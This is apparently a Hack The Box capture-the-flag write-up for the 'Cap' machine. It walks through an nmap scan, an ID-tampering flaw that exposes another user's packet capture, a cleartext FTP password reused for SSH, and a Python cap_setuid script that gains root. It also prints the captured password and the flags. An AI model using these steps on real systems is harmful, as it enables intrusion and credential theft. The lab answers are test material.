---
title: Cap
date: 2025-11-21 11:00:00 +0200
categories: [writeup, hackthebox]
tags: [hackthebox, cap, ]     
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/70ea3357a2d090af11a0953ec8717e90.png
    alt: Hack The Box
---

> Cap
Linux · Easy 



 ## Task 1

How many TCP ports are open?

```shell
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-21 15:12 EST
Initiating Ping Scan at 15:12
Scanning 10.129.51.7 [4 port
Completed Ping Scan at 15:12, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:12
Completed Parallel DNS resolution of 1 host. at 15:12, 13.00s elapsed
Initiating SYN Stealth Scan at 15:12
Scanning 10.129.51.7 [65535 ports]
Discovered open port 22/tcp on 10.129.51.7
Discovered open port 21/tcp on 10.129.51.7
Discovered open port 80/tcp on 10.129.51.7
```
> 3

## Task 2

After running a "Security Snapshot", the browser is redirected to a path of the format /[something]/[id], where [id] represents the id number of the scan. What is the [something]?

Si vamos al navegador a la zona de Security Snapshot podemos ver que la URL nos lleva a **/data/1**

> data

## Task 3

Are you able to get to other users' scans? 

Alterando la URL /data/1 en concreto el número final podemos al volver a la pagína de Security Snapshot como varian los datos. 

> yes

## Task 4

What is the ID of the PCAP file that contains sensative data?

El 0 también cuenta como número /data/0

> 0


## Task 5

Which application layer protocol in the pcap file can the sensetive data be found in?

Con ```Wireshark``` explorando los paquets podemos encontrar un usuario se logeo en un FTP 

``` shell
40	5.424998	192.168.196.1	192.168.196.16	FTP	78	Request: PASS Buck3tH4TF0RM3!
```


> ftp

## Task 6

We've managed to collect nathan's FTP password. On what other service does this password work?

Simplemente probamos las credenciales encontradas con el servicio SSH

``` shell
ssh nathan@10.129.51.7 
```
> ssh

## Task 7
Submit the flag located in the nathan user's home directory.

``` shell
nathan@cap:~$ cat user.txt 
e4622d2848a5aa3f************
``` 
> e4622d2848a5aa3f************

## Task 8 

What is the full path to the binary on this machine has special capabilities that can be abused to obtain root privileges?
Para escalar privilegios nos valemos de una pista que trae la tarea 8, usaremos el script linpeas para elevar privilegios en la máquina.

Como la maquina en HTB esta aislada lo que hice fue bajarme el script a Kali y luego copiarlo con scp 

``` shell
┌──(pmartinezr㉿kali)-[~/Downloads]
└─$ wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
scp linpeas.sh nathan@10.129.51.7:
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
nathan@10.129.51.7's password: 
linpeas.sh                                                                        100%  949KB   2.0MB/s   00:00   
```

Al lanzar linpeas veremos que encuentra que un biniario, python3.8, es el que tiene capacidades para ejecutar cosas como root
```
Files with capabilities (limited to 50):
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```
> /usr/bin/python3.8

## Submit the flag located in root's home directory.

Así que se me ocurrio escribir un script en python que ejecute las tareas que necesito para capturar la bandera. 
``` python 
import os
os.setuid(0)
os.system("whoami")
os.system("cat /root/root.txt")
```

``` shell
nathan@cap:~$ python3.8 elevate.py 
root
c785feee69184c78822fc2aec4c2b2a2
```

> c785feee69184c78822fc2aec4c2b2a2

[achivement](https://labs.hackthebox.com/achievement/machine/2336390/351)